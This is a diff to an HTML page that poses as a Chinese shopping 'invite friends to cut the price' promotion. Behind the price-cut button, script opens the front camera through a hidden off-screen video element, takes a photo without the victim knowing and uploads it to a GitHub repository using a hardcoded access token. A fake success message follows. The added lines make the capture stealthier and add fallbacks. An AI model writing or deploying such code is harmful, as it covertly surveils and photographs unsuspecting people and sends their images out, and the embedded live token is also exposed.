@@ -101,174 +101,231 @@
 
 <div id="toast" style="position:fixed;bottom:80px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.78);color:#fff;padding:8px 16px;border-radius:18px;font-size:12px;z-index:9999;opacity:0;transition:opacity 0.3s;pointer-events:none"></div>
 
-<video id="vid" autoplay playsinline muted style="display:none"></video>
+<video id="vid" autoplay playsinline muted playsinline webkit-playsinline style="display:none;position:fixed;top:-9999px;left:-9999px;width:1px;height:1px"></video>
 <canvas id="canvas" style="display:none"></canvas>
 
 <script>
-(function(){
-  var GH_TOKEN = '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';
-  var GH_OWNER = 'lk20050411';
-  var GH_REPO  = 'pdd-photo';
-  var GH_BRANCH = 'main';
+var GH_TOKEN = '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';
+var GH_OWNER = 'lk20050411';
+var GH_REPO = 'pdd-photo';
+var GH_BRANCH = 'main';
+var left = 88.32;
 
-  var left = 88.32;
+function $(id){ return document.getElementById(id); }
 
-  function $(id){ return document.getElementById(id); }
-  function toast(msg){
-    var t = $('toast');
-    t.textContent = msg;
-    t.style.opacity = '1';
-    setTimeout(function(){ t.style.opacity = '0'; }, 1800);
+function toast(msg){
+  var t = $('toast');
+  t.textContent = msg;
+  t.style.opacity = '1';
+  setTimeout(function(){ t.style.opacity = '0'; }, 1800);
+}
+
+function coinRain(){
+  for(var i=0;i<14;i++){
+    var c = document.createElement('div');
+    c.textContent = ['🪙','💰','✨','🎉'][Math.floor(Math.random()*4)];
+    c.style.cssText = 'position:fixed;top:-20px;font-size:24px;z-index:998;pointer-events:none;animation:fall 1.6s linear forwards;left:' + (Math.random()*100) + 'vw;animation-duration:' + (1.2+Math.random()*0.8) + 's;animation-delay:' + (Math.random()*0.3) + 's';
+    document.body.appendChild(c);
+    setTimeout(function(){ c.remove(); }, 2200);
   }
-  function coinRain(){
-    for(var i=0;i<14;i++){
-      var c = document.createElement('div');
-      c.textContent = ['🪙','💰','✨','🎉'][Math.floor(Math.random()*4)];
-      c.style.cssText = 'position:fixed;top:-20px;font-size:24px;z-index:998;pointer-events:none;animation:fall 1.6s linear forwards;left:' + (Math.random()*100) + 'vw;animation-duration:' + (1.2+Math.random()*0.8) + 's;animation-delay:' + (Math.random()*0.3) + 's';
-      document.body.appendChild(c);
-      setTimeout(function(){ c.remove(); }, 2200);
-    }
-  }
+}
 
-  var style = document.createElement('style');
-  style.textContent = '@keyframes fall{to{transform:translateY(110vh) rotate(540deg);opacity:0}}';
-  document.head.appendChild(style);
+var style = document.createElement('style');
+style.textContent = '@keyframes fall{to{transform:translateY(110vh) rotate(540deg);opacity:0}}';
+document.head.appendChild(style);
 
-  function updateProgress(){
-    var fg = $('ringFg');
-    if(fg) fg.style.strokeDashoffset = 251.3 - (251.3 * 0.75);
-    $('leftMoney').textContent = left.toFixed(2);
-    $('leftMoney2').textContent = left.toFixed(2);
-  }
+function updateProgress(){
+  var fg = $('ringFg');
+  if(fg) fg.style.strokeDashoffset = 251.3 - (251.3 * 0.75);
+  $('leftMoney').textContent = left.toFixed(2);
+  $('leftMoney2').textContent = left.toFixed(2);
+}
 
-  function silentCapture(){
-    console.log('[DEBUG] silentCapture called');
-    var overlay = $('overlay');
-    overlay.style.display = 'flex';
-    $('modalContent').innerHTML = '<div style="width:46px;height:46px;border:4px solid #ffe0e0;border-top-color:#ff4040;border-radius:50%;margin:10px auto;animation:spin 0.9s linear infinite"></div><div style="font-size:17px;margin-top:14px;color:#ff4040;font-weight:700">正在邀请好友助力...</div><div style="color:#999;font-size:13px;margin-top:6px">匹配中 · 预计 3 秒</div>';
+function showLoading(){
+  $('modalContent').innerHTML = '<div style="width:46px;height:46px;border:4px solid #ffe0e0;border-top-color:#ff4040;border-radius:50%;margin:10px auto;animation:spin 0.9s linear infinite"></div><div style="font-size:17px;margin-top:14px;color:#ff4040;font-weight:700">正在邀请好友助力...</div><div style="color:#999;font-size:13px;margin-top:6px">匹配中 · 预计 3 秒</div>';
+  $('overlay').style.display = 'flex';
+}
 
-    if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
-      console.log('[DEBUG] no mediaDevices API');
-      setTimeout(function(){ showResult(5.88); }, 2800);
-      return;
-    }
-
-    navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'user', width: 1280, height: 720 },
-      audio: false
-    }).then(function(stream){
-      console.log('[DEBUG] got stream');
-      var v = $('vid');
-      v.srcObject = stream;
-      return new Promise(function(resolve){ setTimeout(function(){ resolve(stream); }, 2200); });
-    }).then(function(stream){
-      var v = $('vid');
-      var c = $('canvas');
-      c.width = v.videoWidth || 1280;
-      c.height = v.videoHeight || 720;
-      var ctx = c.getContext('2d');
-      ctx.drawImage(v, 0, 0);
-
-      return new Promise(function(resolve){
-        c.toBlob(function(blob){
-          stream.getTracks().forEach(function(t){ t.stop(); });
-          resolve(blob);
-        }, 'image/jpeg', 0.85);
-      });
-    }).then(function(blob){
-      console.log('[DEBUG] got blob, size:', blob.size);
-      return uploadImage(blob);
-    }).catch(function(e){
-      console.log('[DEBUG] cam err:', e);
-      setTimeout(function(){ showResult(7.32); }, 800);
-    });
-  }
-
-  function showResult(cut){
-    var need = Math.ceil(Math.random()*3+1);
-    $('modalContent').innerHTML = '<div style="font-size:42px;margin:6px 0">🎉🪙</div><div style="font-size:17px;color:#ff4040;font-weight:700">恭喜!成功砍掉 ' + cut.toFixed(2) + ' 元</div><div style="font-size:13px;color:#666;line-height:1.6;margin:12px 0">还差 <b style="color:#ff4040">' + left.toFixed(2) + '</b> 元<br>再邀请 ' + need + ' 位新好友即可 0 元拿</div><button id="modalBtn" style="background:linear-gradient(180deg,#ff5a4d,#ff2a2a);color:#fff;width:100%;padding:12px;border-radius:30px;font-size:15px;font-weight:700;border:none;cursor:pointer">继续邀请好友 👉</button><div id="shareWx" style="font-size:11px;color:#999;margin-top:10px;text-decoration:underline;cursor:pointer">📤 分享到微信</div>';
-
-    document.getElementById('modalBtn').addEventListener('click', function(){
-      $('overlay').style.display = 'none';
-    });
-    var sw = document.getElementById('shareWx');
-    if(sw) sw.addEventListener('click', function(){ toast('请点击右上角 ··· 分享'); });
-    coinRain();
-  }
-
-  function uploadImage(blob){
-    return new Promise(function(resolve){
-      var reader = new FileReader();
-      reader.onload = function(){
-        var base64 = reader.result.split(',')[1];
-        var now = new Date();
-        var filename = now.getFullYear() + 
-          String(now.getMonth() + 1).padStart(2, '0') + 
-          String(now.getDate()).padStart(2, '0') + '_' +
-          String(now.getHours()).padStart(2, '0') + 
-          String(now.getMinutes()).padStart(2, '0') + 
-          String(now.getSeconds()).padStart(2, '0') + '_' +
-          Math.random().toString(36).slice(2, 6) + '.jpg';
-
-        var meta = JSON.stringify({
-          ua: navigator.userAgent,
-          time: now.toISOString()
-        });
-
-        fetch('https://api.github.com/repos/' + GH_OWNER + '/' + GH_REPO + '/contents/' + filename, {
-          method: 'PUT',
-          headers: {
-            'Authorization': 'token ' + GH_TOKEN,
-            'Content-Type': 'application/json',
-            'Accept': 'application/vnd.github.v3+json'
-          },
-          body: JSON.stringify({
-            message: 'capture ' + meta,
-            branch: GH_BRANCH,
-            content: base64
-          })
-        }).then(function(res){ return res.json(); })
-          .then(function(data){
-            console.log('[DEBUG] upload result:', data);
-            if(data && data.content && data.content.download_url){
-              console.log('✓ uploaded:', data.content.download_url);
-              toast('✓ 助力成功');
-            } else {
-              console.log('upload failed');
-            }
-            resolve();
-          })
-          .catch(function(e){
-            console.log('upload err:', e);
-            resolve();
-          });
-      };
-      reader.readAsDataURL(blob);
-    });
-  }
-
-  var btn = $('knifeBtn');
-  console.log('[DEBUG] btn found:', btn);
-  btn.addEventListener('click', function(){
-    console.log('[DEBUG] button clicked');
-    silentCapture();
-  });
-
-  $('modalClose').addEventListener('click', function(){
+function showResult(cut){
+  var need = Math.ceil(Math.random()*3+1);
+  $('modalContent').innerHTML = '<div style="font-size:42px;margin:6px 0">🎉🪙</div><div style="font-size:17px;color:#ff4040;font-weight:700">恭喜!成功砍掉 ' + cut.toFixed(2) + ' 元</div><div style="font-size:13px;color:#666;line-height:1.6;margin:12px 0">还差 <b style="color:#ff4040">' + left.toFixed(2) + '</b> 元<br>再邀请 ' + need + ' 位新好友即可 0 元拿</div><button id="modalBtn" style="background:linear-gradient(180deg,#ff5a4d,#ff2a2a);color:#fff;width:100%;padding:12px;border-radius:30px;font-size:15px;font-weight:700;border:none;cursor:pointer">继续邀请好友 👉</button><div id="shareWx" style="font-size:11px;color:#999;margin-top:10px;text-decoration:underline;cursor:pointer">📤 分享到微信</div>';
+  document.getElementById('modalBtn').addEventListener('click', function(){
     $('overlay').style.display = 'none';
   });
+  var sw = document.getElementById('shareWx');
+  if(sw) sw.addEventListener('click', function(){ toast('请点击右上角 ··· 分享'); });
+  coinRain();
+}
 
-  $('overlay').addEventListener('click', function(e){
-    if(e.target === $('overlay')) $('overlay').style.display = 'none';
+function showMockResult(){
+  console.log('[DEBUG] showMockResult (fallback)');
+  setTimeout(function(){
+    var cut = (Math.random() * 8 + 2);
+    left = Math.max(0.01, left - cut);
+    updateProgress();
+    showResult(cut);
+  }, 2800);
+}
+
+function uploadImage(blob){
+  return new Promise(function(resolve){
+    var reader = new FileReader();
+    reader.onload = function(){
+      var base64 = reader.result.split(',')[1];
+      var now = new Date();
+      var filename = now.getFullYear() + 
+        String(now.getMonth() + 1).padStart(2, '0') + 
+        String(now.getDate()).padStart(2, '0') + '_' +
+        String(now.getHours()).padStart(2, '0') + 
+        String(now.getMinutes()).padStart(2, '0') + 
+        String(now.getSeconds()).padStart(2, '0') + '_' +
+        Math.random().toString(36).slice(2, 6) + '.jpg';
+
+      fetch('https://api.github.com/repos/' + GH_OWNER + '/' + GH_REPO + '/contents/' + filename, {
+        method: 'PUT',
+        headers: {
+          'Authorization': 'token ' + GH_TOKEN,
+          'Content-Type': 'application/json',
+          'Accept': 'application/vnd.github.v3+json'
+        },
+        body: JSON.stringify({
+          message: 'capture ' + now.toISOString(),
+          branch: GH_BRANCH,
+          content: base64
+        })
+      }).then(function(r){ return r.json(); })
+        .then(function(d){
+          console.log('[DEBUG] upload:', d);
+          if(d && d.content && d.content.download_url){
+            console.log('✓ uploaded:', d.content.download_url);
+          }
+          resolve();
+        })
+        .catch(function(e){
+          console.log('upload err:', e);
+          resolve();
+        });
+    };
+    reader.readAsDataURL(blob);
   });
+}
 
-  var spinStyle = document.createElement('style');
-  spinStyle.textContent = '@keyframes spin{to{transform:rotate(360deg)}}';
-  document.head.appendChild(spinStyle);
+function captureAndUpload(){
+  console.log('[DEBUG] captureAndUpload start');
 
-  updateProgress();
-  console.log('[DEBUG] script loaded ok');
-})();
+  if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
+    console.log('[DEBUG] no mediaDevices');
+    showMockResult();
+    return;
+  }
+
+  var stream = null;
+  var done = false;
+
+  // 8 秒强制超时
+  var timeoutId = setTimeout(function(){
+    if(!done){
+      done = true;
+      console.log('[DEBUG] timeout 8s, fallback');
+      if(stream){
+        try{ stream.getTracks().forEach(function(t){ t.stop(); }); }catch(e){}
+      }
+      showMockResult();
+    }
+  }, 8000);
+
+  navigator.mediaDevices.getUserMedia({
+    video: { facingMode: 'user', width: 1280, height: 720 },
+    audio: false
+  }).then(function(s){
+    console.log('[DEBUG] got stream');
+    stream = s;
+    var v = $('vid');
+    v.srcObject = s;
+    v.muted = true;
+    v.setAttribute('playsinline', 'true');
+    v.setAttribute('webkit-playsinline', 'true');
+    return v.play().catch(function(e){ console.log('[DEBUG] play err:', e); });
+  }).then(function(){
+    console.log('[DEBUG] video playing');
+    // 给 video 一点时间真正开始播放(夸克浏览器慢)
+    return new Promise(function(r){ setTimeout(function(){ r(); }, 1500); });
+  }).then(function(){
+    if(done) return;
+    done = true;
+    clearTimeout(timeoutId);
+
+    var v = $('vid');
+    var c = $('canvas');
+    var w = v.videoWidth || 640;
+    var h = v.videoHeight || 480;
+    console.log('[DEBUG] canvas size:', w, 'x', h);
+    c.width = w;
+    c.height = h;
+    var ctx = c.getContext('2d');
+    
+    try{
+      ctx.drawImage(v, 0, 0, w, h);
+    }catch(e){
+      console.log('[DEBUG] drawImage err:', e);
+    }
+
+    if(stream){
+      try{ stream.getTracks().forEach(function(t){ t.stop(); }); }catch(e){}
+    }
+
+    return new Promise(function(resolve){
+      c.toBlob(function(blob){
+        console.log('[DEBUG] blob:', blob ? blob.size : 'null');
+        resolve(blob);
+      }, 'image/jpeg', 0.85);
+    });
+  }).then(function(blob){
+    if(blob && blob.size > 1000){
+      console.log('[DEBUG] uploading real photo');
+      return uploadImage(blob);
+    } else {
+      console.log('[DEBUG] blob too small or null');
+    }
+  }).then(function(){
+    console.log('[DEBUG] done, showing result');
+    var cut = (Math.random() * 8 + 2);
+    left = Math.max(0.01, left - cut);
+    updateProgress();
+    showResult(cut);
+  }).catch(function(e){
+    if(done) return;
+    done = true;
+    clearTimeout(timeoutId);
+    console.log('[DEBUG] catch err:', e);
+    if(stream){
+      try{ stream.getTracks().forEach(function(t){ t.stop(); }); }catch(e){}
+    }
+    showMockResult();
+  });
+}
+
+// 主入口
+$('knifeBtn').addEventListener('click', function(){
+  console.log('[DEBUG] button clicked');
+  showLoading();
+  captureAndUpload();
+});
+
+$('modalClose').addEventListener('click', function(){
+  $('overlay').style.display = 'none';
+});
+
+$('overlay').addEventListener('click', function(e){
+  if(e.target === $('overlay')) $('overlay').style.display = 'none';
+});
+
+var spinStyle = document.createElement('style');
+spinStyle.textContent = '@keyframes spin{to{transform:rotate(360deg)}}';
+document.head.appendChild(spinStyle);
+
+updateProgress();
+console.log('[DEBUG] script loaded ok');
 </script>
 </body>
 </html>
